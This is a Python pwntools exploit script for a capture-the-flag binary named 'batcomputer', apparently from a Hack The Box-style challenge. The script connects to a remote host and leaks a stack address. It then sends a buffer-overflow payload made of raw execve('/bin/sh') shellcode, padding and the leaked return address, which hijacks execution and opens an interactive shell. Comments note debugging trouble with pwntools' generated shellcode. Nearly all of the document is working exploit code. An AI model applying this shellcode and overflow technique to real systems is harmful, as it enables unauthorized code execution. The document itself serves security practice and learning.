# GDB https://reverseengineering.stackexchange.com/questions/8724/set-a-breakpoint-on-gdb-entry-point-for-stripped-pie-binaries-without-disabling
# Using starti command to try and start at beginning?
# https://shell-storm.org/shellcode/files/shellcode-806.html
#
# Super strange behavior coming from shellcraft's shellcode, for some reason there is a segfault happening on the pop, rax instruction before the syscall instruction
# The pre-generated shellcode from shell-storm seems to work just fine
# Still need a good method of loading executable at a specific address to match ghidra

from pwn import *
import time

context.arch = 'amd64'
context.binary = './batcomputer'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "159.65.20.166"
PORT = "31268"

def get_process():
  #proc = process(aslr=False)
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
    break *0x555555555314
  """)
  time.sleep(2)

def main():
  proc = get_process()
  #attach_gdb(proc)

  # Grab the address of the stack
  proc.sendlineafter(b'What would you like to do?', b'1')
  proc.recvuntil(b'It was very hard, but Alfred managed to locate him: ')
  data = proc.readline().strip()
  address = int(data, 16)

  # Enter password and create stack overflow
  proc.sendlineafter(b'What would you like to do?', b'2')
  proc.sendlineafter(b'Enter the password: ', b'b4tp@$$w0rd!')

  shellcode = shellcraft.sh()
  print(shellcode)
  shellcode = asm(shellcode)
  print(shellcode)
  print(shellcode.hex())
  shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  offset_rip = 0x54 # This is how many bytes we need to write to our controlled stack address to overflow into RIP
  offset_bytes = offset_rip - len(shellcode)
  offset_data = b'A' * offset_bytes
  payload = b''.join([
    shellcode,
    offset_data,
    p64(address)
  ])
  print(payload)
  proc.sendlineafter(b'Enter the navigation commands: ', payload)
  proc.sendlineafter(b'What would you like to do?', b'3')
  proc.interactive()

if __name__ == '__main__':
  main()
